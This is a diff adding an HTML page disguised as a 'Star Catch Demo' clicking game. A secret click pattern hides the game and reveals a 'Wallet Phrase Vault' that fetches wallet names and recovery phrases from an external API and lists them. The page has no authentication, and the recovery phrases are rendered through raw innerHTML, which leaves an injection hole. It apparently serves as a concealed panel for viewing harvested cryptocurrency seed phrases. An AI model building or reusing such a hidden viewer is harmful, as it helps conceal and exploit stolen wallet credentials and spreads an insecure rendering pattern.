@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Star Catch Demo</title>
+  <style>
+    :root {
+      --glass-bg: rgba(255, 255, 255, 0.08);
+      --glass-border: rgba(255, 255, 255, 0.18);
+      --accent: #9b5cff;
+      --text: #ffffff;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: "Inter", sans-serif;
+      background: radial-gradient(circle at 20% 30%, #151924 0%, #0d1117 100%);
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .glass {
+      backdrop-filter: blur(14px) saturate(150%);
+      -webkit-backdrop-filter: blur(14px) saturate(150%);
+      background: var(--glass-bg);
+      border: 1px solid var(--glass-border);
+      border-radius: 1.25rem;
+      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+      padding: 2rem;
+    }
+
+    #game {
+      width: 320px;
+      height: 320px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1.2rem;
+    }
+
+    .star {
+      position: relative;
+      width: 100%;
+      padding-top: 100%;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.07);
+      border: 2px solid rgba(255,255,255,0.1);
+      cursor: pointer;
+      overflow: hidden;
+      transition: transform 0.15s;
+    }
+    .star:hover { transform: scale(1.05); }
+
+    .star::before {
+      content: "";
+      position: absolute;
+      inset: 15%;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 30%, var(--accent) 0%, transparent 70%);
+      opacity: 0.9;
+      animation: twinkle 3s infinite linear;
+    }
+
+    @keyframes twinkle {
+      0%, 100% { transform: scale(1); opacity: 0.9; }
+      50%      { transform: scale(1.3); opacity: 0.5; }
+    }
+
+    #content {
+      display: none;
+      width: 90vw;
+      max-width: 960px;
+      max-height: 85vh;
+      overflow-y: auto;
+    }
+
+    #content h1 {
+      margin-top: 0;
+      text-align: center;
+      color: var(--accent);
+      font-size: 1.75rem;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 1.5rem;
+    }
+
+    th, td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid var(--glass-border);
+      word-break: break-word;
+    }
+
+    th {
+      background: rgba(255, 255, 255, 0.04);
+      font-weight: 600;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+  <div class="glass" id="gameBoard">
+    <div id="game"></div>
+  </div>
+
+  <div class="glass" id="content">
+    <h1>Wallet Phrase Vault</h1>
+    <table id="phrasesTable">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Wallet Name</th>
+          <th>Recovery Phrase</th>
+          <th>Created</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
+
+  <script>
+    const API_BASE = "https://api.wallet.zephyrequi.com/api";
+    const SECRET_PATTERN = [0, 4, 8, 2];
+    const gameElement = document.getElementById("game");
+    const clicks = [];
+
+    for (let i = 0; i < 9; i++) {
+      const div = document.createElement("div");
+      div.className = "star";
+      div.dataset.index = i;
+      div.addEventListener("click", handleStarClick);
+      gameElement.appendChild(div);
+    }
+
+    function handleStarClick(e) {
+      const idx = Number(e.currentTarget.dataset.index);
+      console.log("Clicked index:", idx);
+      clicks.push(idx);
+
+      if (clicks.length > SECRET_PATTERN.length) clicks.shift();
+      console.log("Click sequence:", clicks);
+
+      if (arraysEqual(clicks, SECRET_PATTERN)) {
+        console.log("Pattern matched. Unlocking...");
+        revealContent();
+      }
+    }
+
+    function arraysEqual(a, b) {
+      return a.length === b.length && a.every((v, i) => v === b[i]);
+    }
+
+    async function revealContent() {
+      document.getElementById("gameBoard").style.display = "none";
+      const content = document.getElementById("content");
+      content.style.display = "block";
+      try {
+        const res = await axios.get(`${API_BASE}/wallet`);
+        console.log("Fetched data:", res.data);
+        renderTable(res.data);
+      } catch (err) {
+        console.error("API error:", err);
+        alert("Failed to fetch wallet phrases. Check console for details.");
+      }
+    }
+
+    function renderTable(data) {
+      const tbody = document.querySelector("#phrasesTable tbody");
+      tbody.innerHTML = "";
+      data.forEach(row => {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td>${row.id}</td>
+          <td>${row.wallet_name}</td>
+          <td>${row.recovery_phrase}</td>
+          <td>${formatDate(row.created_at)}</td>
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+
+    function formatDate(ts) {
+      return new Date(ts).toLocaleString();
+    }
+  </script>
+</body>
+</html>
